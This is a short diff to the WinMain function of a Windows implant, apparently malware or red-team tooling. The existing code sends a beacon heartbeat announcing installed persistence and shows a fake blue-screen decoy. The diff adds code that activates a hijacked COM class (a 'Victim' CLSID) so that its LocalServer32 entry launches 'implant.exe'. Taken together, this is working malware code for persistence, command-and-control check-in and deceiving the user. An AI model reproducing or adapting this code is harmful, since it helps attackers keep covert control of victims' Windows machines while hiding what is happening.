@@ -31,7 +31,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         beacon::Beacon initialBeacon;
         initialBeacon.sendOneTimeHeartbeat("Persistence Installed - Awaiting Reboot/Trigger");
 
-        LOG_INFO("Immediate check-in sent. Showing decoy and exiting.");
+        LOG_INFO("Immediate check-in sent. Triggering COM hijack...");
+
+        // Trigger the COM hijack to verify it works (and potentially start the persistence run)
+        // Victim: {3AD05575-8854-4856-A25F-3627763307B2}
+        CLSID clsidVictim;
+        if (SUCCEEDED(CLSIDFromString(L"{3AD05575-8854-4856-A25F-3627763307B2}", &clsidVictim))) {
+            IUnknown* pUnk = NULL;
+            // This will trigger our LocalServer32 (implant.exe)
+            CoCreateInstance(clsidVictim, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (LPVOID*)&pUnk);
+            if (pUnk) pUnk->Release();
+        }
+
+        LOG_INFO("Showing decoy and exiting.");
 
         // Show BSOD decoy (blocks until CTRL+B)
         decoy::ShowBSOD();
